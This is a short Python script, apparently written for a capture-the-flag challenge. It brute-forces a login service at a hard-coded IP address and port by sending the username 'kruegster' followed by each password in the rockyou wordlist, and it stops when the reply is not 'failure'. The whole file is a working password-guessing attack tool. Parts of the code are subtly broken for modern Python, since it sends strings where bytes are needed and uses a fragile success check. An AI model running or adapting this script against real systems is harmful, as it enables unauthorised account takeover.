import socket

host = "142.93.117.193" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file

def brute_force():
  
  username = "kruegster"  
  
  with open (wordlist,"r") as words:
    for line in words:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        password = line 
        s.send("kruegster\n")  
        data = s.recv(1024)     # Receives 1024 bytes from IP/Port 
        print(data)
        s.send(("{password}\n").format(password=password))
        data = s.recv(1024)     # Receives 1024 bytes from IP/Port
        print(data)                         # Prints data
        if(data != "failure"):
            print(password)
            break
        
if __name__ == '__main__':
    brute_force()
